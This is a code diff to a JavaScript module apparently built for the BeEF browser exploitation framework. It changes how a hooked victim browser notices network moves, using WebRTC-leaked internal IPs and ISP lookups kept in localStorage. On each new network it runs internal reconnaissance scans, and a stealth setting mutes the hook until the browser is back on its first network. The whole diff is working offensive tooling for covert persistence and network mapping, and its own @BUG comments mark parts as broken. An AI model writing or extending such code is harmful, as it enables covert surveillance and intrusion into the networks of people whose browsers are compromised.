@@ -229,21 +229,70 @@ Beefaredormant.prototype.presenceCheck = function() {
         this.verbLog("do checks here..");
 
         this.getRtcIp(function(e) {
-          if (this.checkPreviousRtc(e)) {
-            // rtc hasn't changed
-            this.verbLog("rtc hasn't changed");
-            this.onlineStatus = freshOnlineStatus;
+          if (this.checkLastRtc(e)) {
+            // @BUG - RTC doesn't seem to poll back properly??
 
-            this.startTimers();
+            this.getExternalDetails(function(b) {
+              if (this.checkLastIsp(JSON.parse(b).isp)) {
+                // rtc and isphasn't changed
+                this.verbLog("rtc and ISP hasn't changed since last");
+                this.verbLog("Compared " + e + " to " + localStorage.getItem('rtc_'+this.netcount));
+                this.verbLog("Compared " + JSON.parse(b).isp + " to " + localStorage.getItem('isp_'+this.netcount));
+                this.onlineStatus = freshOnlineStatus;
+
+                this.startTimers();
+              } else {
+                // rtc is the same, ISP has changed - this is that BUG!
+                this.verbLog("rtc is the same, but we've changed ISP");
+                this.verbLog("This is some bug in detecting repeat RTC internal IPs");
+                this.verbLog("Compared " + e + " to " + localStorage.getItem('rtc_'+this.netcount));
+                this.verbLog("Compared " + JSON.parse(b).isp + " to " + localStorage.getItem('isp_'+this.netcount));
+                this.onlineStatus = freshOnlineStatus;
+
+                if (this.checkInitialRtcOrIsp(e, JSON.parse(b).isp)) {
+                  this.verbLog("We are back home now .. ?");
+                  this.backHome();
+                } else {
+                  this.verbLog("We are now on a different ISP");
+                  this.netRecon(e);
+                }
+              }
+            }.bind(this));
+
+
+
           } else {
             // check how different the IP is
             this.verbLog("We were: " + localStorage.getItem('rtc_'+this.netcount));
             this.verbLog("We are now: " + e);
             this.onlineStatus = freshOnlineStatus;
-            // save a new network location object
-            // kick off scan
-            // store results
-            this.netRecon(e);
+
+            this.getExternalDetails(function(b) {
+              if (this.checkInitialRtcOrIsp(e, JSON.parse(b).isp)) {
+                this.verbLog("We are back home now...");
+                this.backHome();
+              } else {
+                this.verbLog("We are definitely not home..");
+                this.netRecon(e);
+              }
+            }.bind(this));
+
+            // @BUG - commented all this because of the stupid RTC issue
+            // // check if we are back home (i.e. first network)
+            // if (this.checkInitialRtc(e)) {
+            //   this.verbLog("We are back home now...");
+            //
+            //   // do we have any cached responses to send?
+            //   //
+            //   // restart the beef hook
+            //   //
+            //   // restart the timers
+            // } else {
+            //   // save a new network location object
+            //   // kick off scan
+            //   // store results
+            //   this.netRecon(e);
+            // }
             
           }
 
@@ -256,13 +305,68 @@ Beefaredormant.prototype.presenceCheck = function() {
   }
 } // end of presenceCheck()
 
-Beefaredormant.prototype.checkPreviousRtc = function(ip) {
+Beefaredormant.prototype.backHome = function() {
+  if (this.stealthLevel > 1) {
+    // we are back home
+    beef.updated.lock = false; // Allow beef to talk again
+
+    // send all cached module responses
+  }
+
+  // kick off timer again
+  this.startTimers();
+}
+
+// checkInitialRtcOrIsp checks the new IP address against the first RTC Ip
+// i.e. are we back home?
+Beefaredormant.prototype.checkInitialRtcOrIsp = function(ip, isp) {
   var result = false;
   if (this.saveLocal === true) {
-    for (var c = 0; c <= this.netcount; c++) {
-      if (ip.toUpperCase() === localStorage.getItem('rtc_'+c).toUpperCase()) {
-        result = true;
-      }
+    if (ip.toUpperCase() === localStorage.getItem('rtc_0').toUpperCase()) {
+      result = true;
+    }
+
+    if (isp.toUpperCase() === localStorage.getItem('isp_0').toUpperCase()) {
+      result = true;
+    }
+    // @BUG - this won't work as it's async duh
+    // It appears that RTC is unable to detect the change back, so lets run the external check and compare
+    // this.getExternalDetails(function(e) {
+    //   if (JSON.parse(e).isp.toUpperCase() === localStorage.getItem('isp_0').toUpperCase()) {
+    //       result = true;
+    //   }
+    //
+    // }.bind(this));
+  }
+
+  return result;
+}
+
+// checkLastRtc checks the new IP address against the last IP
+// not ALL of the previous IPs.
+Beefaredormant.prototype.checkLastIsp = function(isp) {
+  var result = false;
+  if (this.saveLocal === true) {
+    if (isp.toUpperCase() === localStorage.getItem('isp_'+this.netcount).toUpperCase()) {
+      result = true;
+    }
+  }
+
+  return result;
+}
+
+// checkLastRtc checks the new IP address against the last IP
+// not ALL of the previous IPs.
+Beefaredormant.prototype.checkLastRtc = function(ip) {
+  var result = false;
+  if (this.saveLocal === true) {
+    // for (var c = 0; c <= this.netcount; c++) {
+    //   if (ip.toUpperCase() === localStorage.getItem('rtc_'+c).toUpperCase()) {
+    //     result = true;
+    //   }
+    // }
+    if (ip.toUpperCase().toUpperCase() === localStorage.getItem('rtc_'+this.netcount).toUpperCase()) {
+      result = true;
     }
   }
 
@@ -312,10 +416,11 @@ Beefaredormant.prototype.netRecon = function(rtcresult) {
 
     //ping_sweep(mod_input,4,get_http_servers);
     outer_sequential_mod_output = this.rtcIps;
-    this.outer_sequential();
+    this.outer_sequential(this.stealthLevel);
 
 
-    // startTimers();
+    // restart timer
+    this.startTimers();
   }.bind(this));
 } // end of netRecon()
 
